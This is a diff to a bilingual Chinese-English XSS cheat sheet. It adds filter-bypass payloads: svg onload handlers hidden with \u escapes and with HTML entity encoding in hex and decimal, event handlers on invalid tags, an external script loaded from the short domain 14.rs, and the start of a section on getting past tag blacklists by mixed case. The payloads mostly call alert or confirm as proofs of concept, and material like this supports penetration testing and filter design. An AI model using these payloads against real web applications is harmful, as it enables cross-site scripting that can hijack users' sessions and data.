@@ -250,24 +250,53 @@ document.getElementById("c").innerHTML="<img src=@ onerror=alert(3) />";
 ```
 
 - Without alert, confirm, prompt - 不使用alert, confirm, prompt函数
+
 ```
 # <script src=外部js文件
 <script src=//14.rs></script>
 
-# svg标签 - \u编码
+# svg标签 - 编码 \u编码
 <svg onload=co\u006efirm()>
 
-# svg标签 - 畸形属性 \u编码
+# svg标签 - 编码 \u编码 畸形属性
 <svg onload=z=co\u006efir\u006d,z()>
 ```
 
-- Without a Valid HTML tag - 
 ```
-<x onclick=confirm()>click here
-<x ondrag=aconfirm()>drag it
+# svg标签 - html实体编码 chrome下测试成功
+
+例1
+
+原始payload
+<svg/onload="javascript:alert(1)">
+
+实体编码 十六进制
+<svg/onload="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">
+
+实体编码 十进制
+<svg/onload="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+
+----
+
+例2
+
+原始payload
+<svg/onload=alert(2)>
+
+实体编码 十六进制
+<svg/onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x32;&#x29;>
+
+实体编码 十进制
+<svg/onload=&#97;&#108;&#101;&#114;&#116;&#40;&#50;&#41;>
 ```
 
-- Bypass tag blacklisting - 绕过HMTL标签黑名单
+- Without a Valid HTML tag - 不使用有效的html标签
+```
+<x onclick=confirm()>click here
+<x ondrag=confirm()>drag it
+```
+
+- Bypass tag blacklisting - 绕过HTML标签黑名单
 ```
 # 大小写
 </ScRipT>
